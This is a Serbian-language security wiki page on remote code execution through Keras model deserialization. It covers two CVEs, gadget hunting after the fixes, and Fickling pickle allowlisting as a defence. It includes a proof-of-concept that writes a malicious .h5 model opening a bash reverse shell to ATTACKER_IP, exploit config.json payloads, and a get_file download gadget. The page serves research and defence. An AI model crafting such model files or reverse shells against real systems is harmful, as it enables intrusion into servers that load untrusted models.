# RCE deserializacije Keras modela i Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Ova stranica sažima praktične tehnike eksploatacije Keras pipeline-a za deserializaciju modela, objašnjava interne detalje izvornog .keras formata i attack surface, i pruža researcher toolkit za pronalaženje ranjivosti fajlova modela (MFV) i gadgeta nakon ispravke.<sup>[[1]](#references)</sup>

## Interni detalji .keras formata modela

.keras fajl je ZIP arhiva koja sadrži najmanje:<sup>[[1]](#references)</sup>
- metadata.json – opšte informacije (npr. Keras verzija)
- config.json – arhitektura modela (primarni attack surface)
- model.weights.h5 – težine u HDF5 formatu

config.json upravlja rekurzivnom deserializacijom: Keras importuje module, razrešava klase/funkcije i rekonstruiše layer-e/objekte iz dictionary-ja pod kontrolom napadača.<sup>[[1]](#references)</sup>

Primer isečka za Dense layer objekat:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization obavlja:<sup>[[1]](#references)</sup>
- Importovanje modula i razrešavanje simbola iz ključeva `module`/`class_name`
- Pozivanje `from_config(...)` ili konstruktora sa kwargs vrednostima pod kontrolom napadača
- Rekurziju u ugnježdene objekte (`activations`, `initializers`, `constraints`, itd.)

Istorijski gledano, ovo je napadaču koji kreira `config.json` pružalo tri primitive:<sup>[[1]](#references)</sup>
- Kontrolu nad tim koji se moduli importuju
- Kontrolu nad tim koje se klase/funkcije razrešavaju
- Kontrolu nad kwargs vrednostima prosleđenim konstruktorima/`from_config`

## CVE-2024-3660 – Lambda-layer bytecode RCE

Osnovni uzrok:
- `Lambda.from_config()` je koristio `python_utils.func_load(...)`, koji base64-dekoduje i poziva `marshal.loads()` nad bajtovima koje kontroliše napadač; Python unmarshalling može da izvrši kod.<sup>[[1]](#references)[[3]](#references)</sup>

Ideja exploita (pojednostavljeni payload u `config.json`):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mere ublažavanja:
- Keras podrazumevano primenjuje safe_mode=True. Serijalizovane Python funkcije u Lambda su blokirane, osim ako korisnik eksplicitno ne isključi ovu zaštitu pomoću safe_mode=False.<sup>[[1]](#references)</sup>

Napomene:
- Legacy formati (stariji HDF5 save-ovi) ili starije codebase implementacije možda ne primenjuju moderne provere, pa “downgrade” style napadi i dalje mogu da se koriste kada žrtve upotrebljavaju starije loadere.

## CVE-2025-1550 – Arbitrary module import u Keras ≤ 3.8

Osnovni uzrok:
- _retrieve_class_or_fn je koristio neograničeni importlib.import_module() sa stringovima modula pod kontrolom napadača iz config.json.
- Uticaj: Arbitrary import bilo kog instaliranog modula (ili modula koji je napadač postavio na sys.path). Kod koji se izvršava prilikom importa se pokreće, nakon čega se vrši konstrukcija objekta sa kwargs parametrima pod kontrolom napadača.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Exploit ideja:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Poboljšanja bezbednosti (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist: uvozi su ograničeni na module iz zvaničnog ekosistema: keras, keras_hub, keras_cv, keras_nlp
- Podrazumevani safe mode: safe_mode=True blokira učitavanje nebezbednih Lambda serialized-function objekata
- Osnovna provera tipova: deserializovani objekti moraju odgovarati očekivanim tipovima

## Praktična eksploatacija: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Mnogi production stack-ovi i dalje prihvataju legacy TensorFlow-Keras HDF5 model fajlove (.h5). Ako napadač može da uploaduje model koji server kasnije učitava ili nad kojim pokreće inference, Lambda layer može da izvrši proizvoljan Python prilikom učitavanja/build-a/predict-a.<sup>[[7]](#references)</sup>

Minimalni PoC za kreiranje zlonamernog .h5 fajla koji izvršava reverse shell prilikom deserializacije ili korišćenja:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Napomene i saveti za pouzdanost:
- Okidačke tačke: code može da se izvrši više puta (npr. tokom izgradnje/prvog poziva layer-a, `model.load_model` i `predict`/`fit`). Neka payloads budu idempotentni.<sup>[[7]](#references)</sup>
- Pinovanje verzija: uskladite TF/Keras/Python sa verzijama kod žrtve kako biste izbegli neusklađenosti pri serijalizaciji. Na primer, izgradite artifacts pod Python 3.8 sa TensorFlow 2.13.1 ako to koristi cilj.<sup>[[7]](#references)</sup>
- Brza replikacija okruženja:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validacija: benign payload poput os.system("ping -c 1 YOUR_IP") pomaže da se potvrdi izvršavanje (npr. posmatranjem ICMP sa tcpdump) pre prelaska na reverse shell.<sup>[[7]](#references)</sup>

## Gadget surface nakon ispravke unutar allowlist-e

Čak i uz allowlisting i safe mode, među dozvoljenim Keras callable funkcijama ostaje širok prostor. Na primer, keras.utils.get_file može preuzimati proizvoljne URL-ove na lokacije koje bira korisnik.<sup>[[1]](#references)</sup>

Gadget preko Lambda-e koja referencira dozvoljenu funkciju (ne serijalizovani Python bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Važno ograničenje:
- Lambda.call() dodaje ulazni tensor kao prvi pozicioni argument prilikom pozivanja ciljnog callable objekta. Izabrani gadgets moraju tolerisati dodatni pozicioni argument (ili prihvatati *args/**kwargs). Ovo ograničava funkcije koje su upotrebljive.<sup>[[1]](#references)</sup>

## ML pickle import allowlisting za AI/ML modele (Fickling)

Mnogi formati AI/ML modela (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, stariji TensorFlow artefakti itd.) ugrađuju Python pickle podatke. Napadači rutinski zloupotrebljavaju pickle GLOBAL importe i konstruktore objekata da bi postigli RCE ili zamenili model tokom učitavanja. Skeneri zasnovani na blacklistama često ne otkrivaju nove ili nenaštetne opasne importe.<sup>[[8]](#references)[[14]](#references)</sup>

Praktična fail-closed odbrana jeste presretanje Python pickle deserializatora i dozvoljavanje samo proverenog skupa bezopasnih ML-related importa tokom unpicklinga. Fickling kompanije Trail of Bits implementira ovu politiku i isporučuje kuriranu ML import allowlistu napravljenu na osnovu hiljada javnih Hugging Face pickle fajlova.<sup>[[8]](#references)[[13]](#references)</sup>

Security model za „bezbedne“ importe (intuicije sažete iz istraživanja i prakse): simboli koje pickle koristi moraju istovremeno:<sup>[[8]](#references)</sup>
- Ne izvršavati kod niti izazivati izvršavanje (bez kompajliranih/source code objekata, pokretanja shell-a, hookova itd.)
- Ne dobijati niti postavljati proizvoljne atribute ili stavke
- Ne importovati niti dobijati reference ka drugim Python objektima iz pickle VM-a
- Ne pokretati sekundarne deserializatore (npr. marshal, ugnježdeni pickle), čak ni indirektno

Omogućite Fickling zaštite što je ranije moguće tokom pokretanja procesa, kako bi svi pickle load-ovi koje obavljaju framework-i (torch.load, joblib.load itd.) bili provereni:<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Operativni saveti:
- Možete privremeno onemogućiti/ponovo omogućiti hooks gde je potrebno:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Ako je provereni model blokiran, proširite allowlist za svoje okruženje nakon pregleda simbola:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling takođe pruža generičke runtime guard mehanizme ako želite granularniju kontrolu:<sup>[[9]](#references)</sup>
- fickling.always_check_safety() za sprovođenje provera za sve pickle.load()
- with fickling.check_safety(): za sprovođenje provera u određenom opsegu
- fickling.load(path) / fickling.is_likely_safe(path) za pojedinačne provere

- Kada je moguće, prednost dajte formatima modela koji nisu pickle (npr. SafeTensors).<sup>[[15]](#references)</sup> Ako morate da prihvatite pickle, pokrećite loadere sa najmanjim potrebnim privilegijama, bez network egress-a, i primenjujte allowlist.

Ova strategija zasnovana prvenstveno na allowlist-i dokazano blokira uobičajene ML pickle exploit putanje, uz očuvanje visoke kompatibilnosti. U ToB benchmark-u, Fickling je označio 100% sintetičkih malicioznih fajlova i dozvolio približno 99% čistih fajlova iz vodećih Hugging Face repozitorijuma.<sup>[[8]](#references)[[10]](#references)</sup>


## Toolkit za istraživače

1) Sistematsko otkrivanje gadget-a u dozvoljenim modulima

Nabrojte potencijalno opasne callable funkcije u modulima keras, keras_nlp, keras_cv i keras_hub, a zatim dajte prioritet onima koje imaju sporedne efekte nad fajlovima, mrežom, procesima ili env-om.<sup>[[1]](#references)</sup>

<details>
<summary>Nabrajanje potencijalno opasnih callable funkcija u Keras modulima obuhvaćenim allowlist-om</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Direktno testiranje deserializacije (nije potrebna `.keras` arhiva)

Prosledite posebno kreirane dict objekte direktno Keras deserializerima da biste saznali koje parametre prihvataju i posmatrali sporedne efekte.<sup>[[1]](#references)</sup>
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Ispitivanje kroz verzije i formate

Keras postoji u više codebase-ova/era sa različitim zaštitama i formatima:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, predviđen za uklanjanje)
- tf-keras: održava se zasebno
- Multi-backend Keras 3 (official): uveden je native .keras

Ponovite testove kroz različite codebase-ove i formate (.keras naspram legacy HDF5) kako biste otkrili regresije ili nedostajuće zaštite.

## Reference

- [1] [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
